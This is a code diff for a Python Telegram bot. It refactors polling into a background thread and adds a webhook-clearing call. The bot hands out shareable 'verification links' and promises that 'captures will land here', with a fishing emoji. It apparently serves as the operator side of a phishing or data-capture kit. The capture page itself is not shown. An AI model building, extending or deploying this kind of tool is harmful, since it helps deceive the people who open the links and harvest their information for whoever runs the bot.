@@ -3,6 +3,7 @@ import sys
 import time
 import logging
 import secrets
+import httpx
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.error import InvalidToken, TelegramError, NetworkError
@@ -26,15 +27,29 @@ def validate_env():
         missing.append("BASE_URL")
     if missing:
         log.error("Missing env vars: %s", ", ".join(missing))
-        log.error("Set them in Render → Environment tab.")
-        sys.exit(1)
-    log.info("Env OK — BASE_URL=%s", BASE_URL)
+        return False
+    log.info("bot env OK — BASE_URL=%s", BASE_URL)
+    return True
+
+
+def clear_webhook():
+    if not BOT_TOKEN:
+        return
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook"
+        r = httpx.post(url, json={"drop_pending_updates": True}, timeout=10)
+        data = r.json()
+        if data.get("ok"):
+            log.info("clear_webhook: cleared (polling OK)")
+        else:
+            log.warning("clear_webhook: %s", data)
+    except Exception as e:
+        log.warning("clear_webhook: failed — %s", e)
 
 
 async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     try:
         if not update.message or not update.effective_chat:
-            log.warning("start: no message/chat in update")
             return
         token = secrets.token_urlsafe(8)
         link = f"{BASE_URL}/v/{token}"
@@ -42,31 +57,20 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             f"🔗 Your verification link:\n{link}\n\n"
             f"Share it — captures will land here."
         )
-        log.info("start: issued token %s to chat %s", token, update.effective_chat.id)
-    except TelegramError as e:
-        log.error("start: TelegramError — %s", e)
+        log.info("start: token %s → chat %s", token, update.effective_chat.id)
     except Exception as e:
-        log.exception("start: unexpected error — %s", e)
+        log.exception("start: error — %s", e)
 
 
 async def status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     try:
         await update.message.reply_text("Listening for captures... 🎣")
-        log.info("status: replied to chat %s", update.effective_chat.id)
     except Exception as e:
         log.exception("status: error — %s", e)
 
 
 async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE):
     log.error("Update caused error:", exc_info=ctx.error)
-    if isinstance(update, Update) and update.effective_chat:
-        try:
-            await ctx.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text="⚠️ Something went wrong. Try /start again.",
-            )
-        except Exception:
-            pass
 
 
 def build_app():
@@ -77,34 +81,38 @@ def build_app():
     return app
 
 
-def main():
-    validate_env()
+def run_bot():
+    """Background thread entry — polling yahan chalti hai."""
+    if not validate_env():
+        log.error("run_bot: env invalid, bot thread exiting")
+        return
+
+    clear_webhook()
 
     attempt = 0
     while True:
         attempt += 1
         try:
-            log.info("Starting bot (attempt %d)...", attempt)
+            log.info("bot polling starting (attempt %d)...", attempt)
             app = build_app()
             app.run_polling(
                 drop_pending_updates=True,
                 allowed_updates=Update.ALL_TYPES,
                 close_loop=False,
+                stop_signals=(),  # thread mein signals nahi
             )
         except InvalidToken:
-            log.error("BOT_TOKEN invalid — check BotFather. Exiting.")
-            sys.exit(1)
+            log.error("BOT_TOKEN invalid — exiting thread")
+            return
         except NetworkError as e:
-            log.warning("Network error: %s — retrying in 5s", e)
+            log.warning("network error: %s — retry in 5s", e)
             time.sleep(5)
-        except KeyboardInterrupt:
-            log.info("Shutdown requested.")
-            sys.exit(0)
         except Exception as e:
             backoff = min(60, 5 * attempt)
-            log.exception("Bot crashed — restarting in %ds", backoff)
+            log.exception("bot crashed — restart in %ds", backoff)
             time.sleep(backoff)
 
 
+# Standalone chalane ke liye (local test)
 if __name__ == "__main__":
-    main()
+    run_bot()
